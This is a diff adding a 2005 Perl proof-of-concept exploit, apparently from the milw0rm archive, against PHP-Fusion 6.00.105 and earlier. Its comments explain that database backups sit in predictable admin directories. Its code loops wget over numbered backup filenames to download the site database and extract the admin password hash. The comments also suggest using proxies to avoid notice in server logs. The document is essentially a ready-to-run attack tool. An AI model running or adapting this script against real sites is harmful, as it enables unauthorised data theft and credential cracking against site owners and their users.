@@ -1,0 +1,80 @@
+ #!/usr/bin/perl
+ ######################################################
+ #  D A R K   A S S A S S I N S   C R E W   2 0 0 5   #
+ ######################################################
+ # Dark Assassins - http://dark-assassins.com/        #
+ # Visit us on IRC @ irc.tddirc.net #DarkAssassins    #
+ ######################################################
+ # phpfusiondb.pl; Version 0.1 22/06/05               #
+ # PHP-Fusion db backup proof-of-concept by Easyex    #
+ # Database backup vuln in v6.00.105 and below        #
+ ######################################################
+ # Description: When a db (database) backup is made   #
+ # it is saved in /administration/db_backups/ on 6.0  #
+ # and on 5.0 it is saved in /fusion_admin/db_backups/#
+ # The backup file can be saved in 2 formats: .sql or #
+ # .sql.gz and is hidden by a blank index.php file but#
+ # can be downloaded client-side, The filename is for #
+ # example : backup_2005-06-22_2208.sql.gz so what we #
+ # can do is generate 0001 to 9999 and request the    #
+ # file and download it. If a db file is found an     #
+ # attacker can get the admin hash and crack  it or   #
+ # retrieve other sensitive information from the db!  #
+ ######################################################
+
+ # 9999 requests to the host is alot, And would get noticed in the server log!
+ # If you re-coded your own script with proxy support you would be fine.
+ # You need to know the backup year-month-day to be able to find a backup file unless the server is set to automaticlly   
+ # backup the php-fusiondatabase.
+
+ my $wget='wget';
+
+ my $count='0';
+
+ my $target;
+
+ if (@ARGV < 4)
+{
+ print "\n";
+ print "Welcome to the PHP-Fusion db backup vulnerability\n";
+ print "Coded by Easyex from the Dark Assassins crew\n";
+ print "\n";
+ print "Usage: phpfusiondb.pl <host> <version> <file> <extension>\n";
+ print "Example: phpfusiondb.pl example.com 6 backup_2005-06-23_ .sql.gz\n";
+ print "\n";
+ exit();
+}
+
+ my $host = $ARGV[0];
+ my $ver = $ARGV[1];
+ my $file = $ARGV[2];
+ my $extension = $ARGV[3];
+
+ if ($ver eq "6") {
+       $dir='/administration/db_backups/'; # Directory path to the 6.X backup folder
+ }
+
+ if ($ver eq "5") {
+       $dir='/fusion_admin/db_backups/'; # Directory path to the 5.X backup folder
+}
+
+ print "\n";
+ print "Welcome to the PHP-Fusion db backup vulnerability\n";
+ print "Coded by Easyex from the Dark Assassins crew\n";
+ print "\n";
+
+ print "Host: $host\n";
+ print "Directory: $dir\n";
+ print "File: $file + 0001 to 9999\n";
+ print "Extension: $extension\n";
+ print "\n";
+ print "Attempting to find a db backup file on $host\n";
+
+ for($count=0;$count<9999;$count++) {
+
+    $target=$host.$dir.$file.sprintf("%04d", $count).$extension;
+
+    system("$wget $target");
+ }
+
+# milw0rm.com [2005-06-25]
